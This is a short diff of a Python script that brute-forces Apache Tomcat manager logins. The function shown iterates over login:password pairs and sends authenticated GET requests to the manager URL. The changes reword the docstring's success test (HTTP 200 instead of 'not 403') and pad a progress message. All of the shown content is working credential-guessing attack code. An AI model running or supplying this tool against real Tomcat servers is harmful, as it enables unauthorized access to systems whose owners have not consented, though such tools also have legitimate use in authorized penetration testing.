@@ -101,15 +101,15 @@ credentials = [
 
 def brute(args):
     """
-    Iterate over login:password pairs from credentials and send GET request to 
+    Iterate over login:password pairs from credentials array and send GET request to 
     Apache Tomcat with Authorization header set
 
-    If HTTP response status is not equal 403, we probably found valid credentials
+    If HTTP response status is equal 200, we found valid credentials
     """
     url = "{}://{}:{}/{}".format(args.proto.lower(), args.host, args.port, args.manager)
     for lp in credentials:
         (login, password) = lp.split(':')
-        print("[.] checking {}:{}...\r".format(login, password), end="")
+        print("[.] checking {}:{}..................................................\r".format(login, password), end="")
         resp = requests.get(
             url=url,
             auth=(login, password)
